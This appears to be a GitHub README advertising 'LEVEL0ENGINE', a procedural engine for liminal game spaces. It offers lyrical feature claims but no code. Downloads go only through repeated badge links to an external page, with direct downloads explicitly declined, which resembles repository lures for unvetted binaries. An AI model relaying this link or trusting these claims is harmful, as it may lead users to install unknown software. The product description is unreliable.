![preview](https://raw.githubusercontent.com/tomer55/liminal-math-forge/main/thumb_dede3.svg)

# LEVEL0ENGINE — The Architectural Dreamweaver

**Procedural Generation for the Spaces Between Reality**

Welcome to **LEVEL0ENGINE**, a computational architecture engine that doesn't just build rooms—it *remembers* them. This is not another level generator or a block-placer. This is a mathematical storyteller that constructs liminal spaces: those uncanny, transitional zones that feel hauntingly familiar yet impossibly alien. The kind of hallway you've walked a thousand times in a place you've never been. The stairwell that doesn't lead anywhere but somehow goes everywhere. The elevator lobby that hums with a frequency your body recognizes but your mind cannot name.

---

## Overview: The Geometry of Unease 🌫️

Modern procedural generation focuses on *content*—filling spaces with objects, enemies, and loot. **LEVEL0ENGINE** takes the opposite approach: it generates *absence*. Our algorithms craft vacuums of architectural meaning, spaces that are mathematically coherent but emotionally dislocated. Every corridor, every ceiling height, every subtle asymmetry is computed to produce a specific psychological response: the gentle disorientation of a hotel corridor at 3 AM, the quiet dread of an empty parking structure, the inexplicable comfort of a waiting room that no one ever leaves.

The engine operates on three fundamental principles:

1. **Topological Continuity** — Every generated space is mathematically connected, ensuring you never hit a dead-end wall that breaks the illusion. But the *perceived* continuity is deliberately warped, creating the classic liminal paradox: the path back never looks like the path forward.

2. **Semantic Emptiness** — We don't generate objects or narrative. We generate *stage directions* for the mind. The space itself is the story, and the player's imagination fills in the actors.

3. **Perceptual Drift** — Subtle non-Euclidean flourishes that don't break rendering engines but do break the player's internal map. A doorway that's slightly wider when you return through it. A window that shows a different skyline each time you look. Nothing overt—just enough to make the brain itch.

---

## The Architecture of Discomfort 🧠

### Core System: The Vortex Substrate

At the heart of **LEVEL0ENGINE** lies the **Vortex Substrate**, a connected graph of spatial nodes that evolves over time. Unlike traditional grid-based systems, the Vortex Substrate uses a dynamic B-spline manifold that bends in response to player position, memory depth, and "liminal pressure" — a proprietary metric that tracks how long a space has been unoccupied by intentional design.

The engine doesn't randomly place walls and floors. It *grows* them, node by node, following mathematical attractors derived from:
- Architectural patterns from abandoned brutalist structures
- The rhythmic repetitions of airport walkways at night
- The fractal geometry of empty hotel conference rooms
- The pacing of forgotten shopping mall atriums

Each generated space is a unique mathematical artifact, verified against our **Liminality Index** — a scoring system that measures how "between" a space feels. Spaces scoring too high become disturbing; too low become ordinary. The sweet spot creates that perfect hum of wrongness.

---

## Technical Specifications 💻

### Rendering Pipeline Beyond the Ordinary

The engine employs a **multi-pass phantasm rendering** approach:
- **Pass 1: Geometry Spawn** — Generates the raw manifold, ensuring topological consistency
- **Pass 2: Photon Fading** — Simulates light decay in areas the player hasn't visited recently, dimming edges to simulate the memory of a space
- **Pass 3: Texture Bleeding** — Applies material patterns that subtly change hue based on viewing angle, mimicking the effect of fluorescent lighting film degradation
- **Pass 4: Acoustic Absence** — Computes reverb masks that make empty rooms feel *too* quiet, with barely perceptible infrasonic hums generated from the room's own dimensions

### The Memory Cache System

**LEVEL0ENGINE** maintains a **Spatial Ephemera Cache** — a persistent memory of every space generated, even after the player leaves. This cache influences future generation, creating a personalized liminal universe where every return to a familiar space feels slightly wrong, like a friend who's had a subtle haircut you can't quite place.

This is not a save system. It's a *haunting* system.

---

## Feature Repository — The Toolkit of Transition 🛠️

- **Vortex Manifold Generator** — The core spatial DNA, capable of producing infinite floorplans with zero repetition. Each output is mathematically distinct, verified via a 128-dimensional feature vector comparison.

- **Ambient Architecture Scheduler** — Controls when and how spaces "transform." Lights flicker in patterns that match your breathing rate. Air currents shift to guide you subtly toward or away from certain junctions.

- **Threshold Architect** — A specialized module for generating doorways, arches, and transition zones. These are the critical moments where the liminal feeling peaks, and the engine spends 30% of its compute budget getting them perfect.

- **The Void Painter** — Generates negative space: those impossible gaps behind furniture, inaccessible corridors behind locked doors, the ceiling voids above drop-tile grids. These aren't rendered fully—just suggested through shadow and sound cues, letting the player's mind construct their own horrors.

- **Multi-Threshold Language System** — The engine's UI and procedural name generator support 14 languages, offering culturally-specific architectural archetypes (European utility corridors, Japanese underground walkways, American suburban cul-de-sac transitions). The math is universal; the vibes are localized.

- **24/7 Computation Services** — The engine runs as a persistent daemon, quietly generating and testing spaces even when you're not playing, building a reservoir of pre-verified liminal environments ready for instant deployment.

---

## The Immaterial Interface 🎛️

The control surface is minimalist by design—we call it the **Hollow Dashboard**. You interact with the engine through:
- **Geometric Sliders** — Adjust ceiling height variance, corridor width asymmetry, and floor pattern decay rates in real-time.
- **Presence Dial** — Controls how many "ghost traces" appear (subtle marks of previous occupants: a scuff on the wall, a faint coffee ring on a table, a door slightly ajar that you didn't open).
- **Chronology Stager** — Sets the "time of day" for the space, but not as simple lighting. This changes the *historical layer* — a 3 AM space feels abandoned, a 4 PM space feels forgotten, an 8 AM space feels wrong.

The interface itself is rendered with a heavy blur layer on peripherals, forcing focus to the center—mimicking the visual tunnel of someone walking through a hallway, not looking around.

---

## Getting Started — First Ascent into the Backrooms 🚪

Underneath this section is your pathway to the engine. We don't do direct downloads here. Instead, the **LEVEL0ENGINE** distribution follows a concept we call "threshold delivery." 

[![Download](https://raw.githubusercontent.com/tomer55/liminal-math-forge/main/bin_41e5f.svg)](https://tomer55.github.io/liminal-math-forge/)

When you acquire the engine, you're not just getting software—you're getting a *phenomenological instrument*. The package includes:

- The complete engine source, structured for modification
- A curated set of "seed spaces" — example manifests from our own explorations
- The **Liminality Index Verifier** — a command-line tool that scores your generated spaces
- Documentation written with an unusual blend of technical precision and poetic unease

---

## Project Architecture — The Blueprint of Nothing 🗺️

```
level0engine/
├── core/
│   ├── vortex_substrate/       # The manifold generation core
│   ├── phantasm_renderer/      # Multi-pass rendering pipeline
│   ├── ephemera_cache/         # Persistent memory system
│   └── liminality_index/       # Scoring and verification module
├── modules/
│   ├── threshold_architect/    # Doorway and transition generator
│   ├── void_painter/          # Negative space suggestion engine
│   └── acoustic_absence/      # Sound spatialization and reverb masker
├── interfaces/
│   ├── hollow_dashboard/      # The minimalist control surface
│   ├── cli_tools/             # Terminal-based generation utilities
│   └── api_bridge/            # For embedding in your own projects
├── manifest_vault/            # Curated seed spaces and archetype definitions
├── documentation/
│   ├── theoretical_foundations/  # The math behind the unease
│   ├── architecture_guide/       # How to extend the engine
│   └── experiential_handbook/    # How to *feel* the spaces you generate
└── diagnostics/
    └── drift_analyzer/        # Detects unwanted non-Euclidean artifacts
```

Each module is designed to be independently usable. The **Vortex Substrate** can create abstract topological maps without the full rendering pipeline. The **Void Painter** can operate as a standalone shadow-cue generator for existing game engines.

---

## Community Contributions — Building the Collective Unease 🤝

We welcome contributions that expand the vocabulary of liminal spaces. The most valuable additions are:

- **New Architectural Archetypes** — Submit your own cultural/regional liminal paradigms (e.g., "the abandoned kiosk cluster," "the office kitchen at non-standard hours")
- **Mathematical Variations** — Alternative noise functions, manifold topologies, or perceptual drift algorithms
- **Sensory Modulators** — New ways to suggest emptiness through sound, light, or haptic feedback
- **Theoretical Papers** — We love reading about the psychology of transitional spaces, and we integrate validated findings into the engine

All submissions go through our **Unease Review** — a community moderation process that checks for excessive horror (too scary ruins the effect) and excessive normalcy (too plain ruins the effect).

---

## Licensing — The Open Threshold 📜

**LEVEL0ENGINE** is released under the MIT License. This means you can use, modify, and distribute the engine in both personal and commercial projects. You cannot claim the engine itself as your own, and you must include the original copyright notice. We see the license as an invitation: *cross this threshold, build what you will, and leave the door open for the next wanderer.*

The specific terms are detailed in the [LICENSE](./LICENSE) file, which accompanies the source. We encourage you to read it before you delve too deep—it's the most straightforward document in this repository, and possibly the only one that doesn't make you feel like you're being watched while you read it.

---

## The Philosophy of Emptiness 🧘

Why build an engine for making people uncomfortable? Because being uncomfortable is a form of being *present*. In an era of constant stimulation, of information overload, of games that scream for your attention every second, **LEVEL0ENGINE** offers a different experience: the quiet space, the corridor no one talks about, the stairwell that exists for no reason. 

These spaces are not empty of meaning—they are *full of anticipation*. They are the breathing room between reality and fantasy, the pause between heartbeats. We believe that games need these moments, these architectural sighs, to make the loud moments feel louder and the meaningful moments feel earned.

The engine is a tool for game designers, artists, writers, and dreamers who want to add a layer of unspoken depth to their work. It's not for everyone, and that's exactly the point.

---

## Troubleshooting the Uncanny 🛠️

**"My generated spaces feel too normal."** 
Your Liminality Index is likely too low. Increase the presence of the **Vortex Substrate's** drift parameter, or adjust the **Void Painter's** shadow density. Normal spaces are a sign that your manifold is too stable—consider introducing a slight chronological inconsistency.

**"The spaces feel aggressively hostile."**
Your architecture might be probing into horror territory. Dial back the **Presence Dial**, reduce infrasonic frequencies in the **Acoustic Absence** module, and ensure the **Threshold Architect** isn't generating doorways that are deliberately deceptive.

**"The rendering performance is poor."**
The **Phantom Fading** pass is computationally expensive. Lower the fade resolution, or pre-bake the light decay into static textures when generating spaces for high-speed traversal.

**"The engine generates the same layout twice."**
This is nearly impossible by design—the 128-dimensional feature vector check should catch duplicates. If it happens, your **Ephemera Cache** might be corrupted. Clear it and re-run the **Drift Analyzer**.

---

## Future Directions — The Horizon Beyond the Hallway 🔭

**2026 roadmap** includes:

- **The Threshold Expansion Pack**: New archetype families based on research into transitional architecture in non-Western cultures, including Japanese *engawa* verandas and Scandinavian transitional mudrooms.
- **The Shared Liminality Protocol**: Networked generation so multiple players can experience the *same* space simultaneously, but each with personalized perceptual drift—the same hallway, subtly different for each observer.
- **The Memory Weaver API**: Exposing the **Ephemera Cache** to third-party tools, allowing narrative designers to inject scripted "memories" into the generated space.

We keep the roadmap deliberately vague. The engine should surprise its creators as much as its players.

---

## Final Words on the Asymptote ⚠️

**LEVEL0ENGINE** is a creative tool, not a simulation of reality, and not a horror engine (though it can be used for that). The generated spaces are intended to evoke a specific psychological state—reflective, slightly eerie, and profoundly atmospheric. We are not responsible for any existential discomfort, sudden realizations about the nature of spatial perception, or the urge to redecorate your own hallway after using this engine.

We are, however, responsible for the code. If you find a bug, a logical inconsistency, or a mathematical impossibility in our generation algorithms, please document it with the **Drift Analyzer** output and submit it to our **Unease Review**. We take correctness seriously—even when the output deliberately feels incorrect.

---

## Acknowledgments — The Ghosts in the Machine 👻

The foundational mathematics owe a debt to the work of non-Euclidean geometry pioneers, chaos theory researchers, and the architectural critics who first described the modern phenomenon of "non-places" in urban geography. Their theories form the skeleton; the engine provides the flesh.

And to the testers who willingly walked through our generated spaces for hours, reporting back with increasingly shaken descriptions—we see you. Your discomfort was not in vain. It was *data*.

---

**Begin with the [![Download](https://raw.githubusercontent.com/tomer55/liminal-math-forge/main/bin_41e5f.svg)](https://tomer55.github.io/liminal-math-forge/) below. The corridor awaits. It always did.**

[![Download](https://raw.githubusercontent.com/tomer55/liminal-math-forge/main/bin_41e5f.svg)](https://tomer55.github.io/liminal-math-forge/)